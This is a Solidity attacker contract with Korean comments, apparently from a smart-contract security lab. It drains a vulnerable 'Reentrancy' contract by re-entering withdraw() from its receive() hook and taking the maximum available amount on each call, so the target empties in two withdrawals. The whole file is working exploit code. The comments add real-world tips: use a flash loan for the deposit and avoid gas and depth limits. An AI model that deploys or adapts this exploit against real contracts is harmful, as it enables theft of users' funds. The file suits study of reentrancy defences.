// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Reentrancy} from "./Reentrancy.sol";

/// @title ReentrancyAttackerMax — "1회 재진입에 최대 금액"형 재진입 공격
/// @notice 0.1씩 찔끔(수백 번 재귀, 가스로 막힘) 대신, 매 호출마다 뺄 수 있는 최대를 빼서
///         컨트랙트를 단 2번의 withdraw로 비운다. 깊이·가스 한계에 안 걸리는 실전 방식.
/// @dev 전제: 피해자 잔액 이상을 미리 예치(현실에선 flash loan으로 빌렸다 공격 후 상환).
///      재진입 중 장부(balanceOf)는 차감 전이라 그대로 → 매 호출 min(컨트랙트잔액, 내장부)만큼 인출.
contract ReentrancyAttackerMax {
    Reentrancy public immutable target;
    address public immutable owner;
    uint256 public calls; // withdraw 호출 횟수(시연용 — 찔끔형 51회 vs 이 방식 2회 비교)

    constructor(address _target) {
        target = Reentrancy(payable(_target));
        owner = msg.sender;
    }

    /// @notice msg.value(>= 피해자 잔액 권장)를 예치한 뒤 최대 금액으로 출금 시작.
    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        _drainMax();
    }

    receive() external payable {
        _drainMax(); // 재진입: 장부 차감 전에 다시 최대로
    }

    /// @dev 지금 뺄 수 있는 최대 = min(컨트랙트 잔액, 내 장부 잔액).
    function _drainMax() internal {
        uint256 pot = address(target).balance;
        uint256 ledger = target.balanceOf(address(this));
        uint256 amount = pot < ledger ? pot : ledger;
        if (amount > 0) {
            calls++;
            target.withdraw(amount);
        }
    }

    function collect() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}
